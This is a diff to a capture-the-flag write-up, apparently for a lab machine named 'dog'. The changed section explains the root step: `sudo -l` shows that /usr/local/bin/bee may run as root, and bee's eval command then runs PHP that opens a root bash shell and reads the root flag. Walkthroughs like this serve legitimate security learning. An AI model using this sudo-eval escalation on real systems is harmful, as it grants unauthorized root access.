@@ -423,6 +423,12 @@ johncusack@dog:~$ cat user.txt
 
 Nice, we did it
 
+---
+
+#### Root Explatation
+
+The `sudo -l` command shows you which commands you are allowed to run with administrative privileges, and as which users (usually **root**). This helps you understand what is available to you without having to guess.
+
 ```
 johncusack@dog:~$ sudo -l
 [sudo] password for johncusack: 
@@ -433,6 +439,8 @@ Matching Defaults entries for johncusack on dog:
 User johncusack may run the following commands on dog:
     (ALL : ALL) /usr/local/bin/bee
 ```
+
+Nicem let's run it
 
 ```
 johncusack@dog:~$ /usr/local/bin/bee
@@ -647,8 +655,25 @@ Commands:
    Open an SQL command-line interface using Backdrop's database credentials.
 ```
 
+Using the `eval` command, we can execute arbitrary **PHP** code in the context of **Backdrop CMS**. The `--root` flag allows targeting a specific installation, making this combination a potential vector for privilege escalation or code execution.
+
 ```
-johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
-503134386e6c68c2b******
-johncusack@dog:~$ 
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash");'
+root@dog:/var/www/html# ls
+core
+files
+index.php
+layouts
+LICENSE.txt
+modules
+README.md
+robots.txt
+settings.php
+sites
+themes
+
+root@dog:/var/www/html# cat /root/root.txt
+2348a8bf5010997f95*****
 ```
+
+Congratulations!
